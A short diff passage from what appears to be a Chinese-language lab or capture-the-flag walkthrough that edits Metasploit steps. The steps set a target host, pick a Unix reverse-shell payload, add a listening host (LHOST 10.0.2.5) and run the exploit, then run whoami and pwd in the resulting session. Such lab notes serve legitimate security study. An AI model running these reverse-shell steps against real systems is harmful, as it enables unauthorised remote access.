@@ -30,7 +30,8 @@
 2. use 0
 3 set RHOST 10.0.2.6
 4. set payload cmd/unix/reverse
-5. exploit
+5. set LHOST 10.0.2.5
+6. exploit
 等到 session open 後,
 whoami
 pwd
